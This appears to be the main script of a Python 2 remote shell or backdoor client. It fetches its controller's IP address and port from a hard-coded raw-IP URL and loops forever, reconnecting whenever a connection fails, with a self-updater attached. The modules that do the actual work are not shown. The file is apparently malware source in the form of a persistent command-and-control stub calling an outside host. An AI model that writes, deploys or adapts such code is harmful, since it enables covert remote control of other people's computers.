#!/usr/bin/python

import ConfigManager, functions, update, sys

class shell(object):
    updater = update.Update()
    config = ConfigManager.ConfigManager("http://85.255.5.44/vxsrfp/eurnni.html")
    host = config.IpAddress
    port = config.Port

    notConnected = True
    exiting = False

    functions = functions.functions(host, port)
    def main(self):
        if len(sys.argv) == 1:
            while (self.notConnected and not self.exiting):
                try:
                    self.notConnected = False
                    self.exiting = self.functions.start()
                    self.notConnected = True
                except:
                    self.notConnected = True
        else:
            if (sys.argv[1] == '-v'):
                print self.updater.getVersion()

if __name__ == '__main__':
    shell().main()










